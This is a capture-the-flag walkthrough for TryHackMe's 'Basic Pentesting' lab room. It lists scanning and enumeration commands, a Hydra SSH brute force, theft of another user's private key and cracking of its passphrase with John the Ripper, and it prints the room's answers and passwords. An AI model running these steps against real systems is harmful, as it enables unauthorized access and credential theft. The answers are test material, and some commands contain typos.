# TryHackMe - Basic Pentesting

> August 1, 2021

1. What is the name of the hidden directory on the web server(enter name without /)?

    Nmap:

        # Found open ports

        Command:
        $> nmap -sC -sV -oN nmap/inital 10.10.11.166

        Ports: {22, 80, 139, 445}
        
        # Found the directory

        Command:
        $> nmap -script http-enum.nse 10.10.11.166 

    Gobuster:

        # Found the directory

        Command:
        $> gobuster dir -u http://10.10.11.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  

    `Answer: /development/`

2. What is the username?

	enum4linux:

		# Found the username

        Command:
        $> enum4linux -a 10.10.11.166 | tee enum4linux.log

	`Answer: jan`

3. What is the password?

	Hydra:

		-l is 1 username -L is a file of usernames
		-p is 1 password -P is a file of passwords

        Command:
		$> hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166

	`Answer: armando`

	Now we can ssh jan@10.10.11.166 with the new password `'armando'`

4. What service do you use to access the server(answer in abbreviation in all caps)? 

	`Answer: SSH`

5. Enumerate the machine to find any vectors for privilege escalation.
	
	SCP:

		SCP is a command to copy files through ssh connection.

        Command:
		$> scp /linpeas.sh jan@10.10.11.166/dev/shm
		$> chmod +x linepeas.sh
	
	linPEAS:
        
        Command:
		$> ./linpeas.sh | tee linlog.txt
		discovered kay had a id_rsa private key available
		$> cd .ssh/
		$> cat id_rsa
		$> touch, nano kay_id_rsa
		$> chmod 600 kay_id_rsa 
		* Private keys like read only
		$> ssh -i kay_id_rsa kay@10.10.11.166
		* Need's a passphrase

	JohnTheRipper:

        Command:
		$> JohnTheRipper/run/ssh2john.py kay_id_rsa > forjohn.txt
		$> JohnTheRipper/run/john forjohn.txt --wordlist=rockyou.txt

	`Answer: beeswax`

6. What is the name of the other user you found(all lower case)? 

	enum4linux:

		# Found the username

        Command:
        $> enum4linux -a 10.10.11.166 | tee enum4linux.log

	`Answer: kay`

7. What is the final password you obtain? 

	SSH:

        Command:
		$> ssh -i kay_id_rsa kay@10.10.11.166
		* Use the passphrase: beeswax
		$> cat pass.bak

	`Answer: heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
